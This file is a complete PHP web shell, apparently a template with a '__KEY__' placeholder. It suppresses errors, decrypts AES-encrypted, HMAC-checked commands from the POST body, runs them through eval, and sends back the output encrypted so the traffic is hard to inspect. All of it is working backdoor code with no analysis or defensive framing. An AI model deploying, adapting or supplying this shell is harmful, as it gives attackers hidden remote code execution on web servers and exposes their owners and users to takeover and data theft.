<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', '0');

function Decrypt($data) {
    $prefixLen = 68;
    if (strlen($data) <= $prefixLen + 48) {
        return "";
    }
    $encrypted = substr($data, $prefixLen);
    
    $key = "__KEY__";
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return "";
    
    $aesKey = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
    }
    
    $iv = substr($encrypted, 0, 16);
    $tag = substr($encrypted, -32);
    $body = substr($encrypted, 16, -32);
    
    $macData = $iv . $body;
    $check = hash_hmac('sha256', $macData, $aesKey, true);
    if ($check !== $tag) {
        header("HTTP/1.1 500 Internal Server Error");
        exit();
    }
    
    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
}

function Encrypt($data) {
    $key = "__KEY__";
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return "";
    
    $aesKey = "";
    $ivStr = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
        $ivStr .= chr($raw[$i % $rawLen] ^ 0x2E);
    }
    
    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
    $macData = $ivStr . $enc;
    $tag = hash_hmac('sha256', $macData, $aesKey, true);
    
    return $ivStr . $enc . $tag;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postData = file_get_contents("php://input");
    if (!empty($postData)) {
        $deMsg = Decrypt($postData);
        if (!empty($deMsg)) {
            ob_start();
            try {
                @eval($deMsg);
            } catch (\Throwable $e) {
            }
            $output = ob_get_contents();
            ob_end_clean();
            echo Encrypt($output);
        }
    }
}
?>
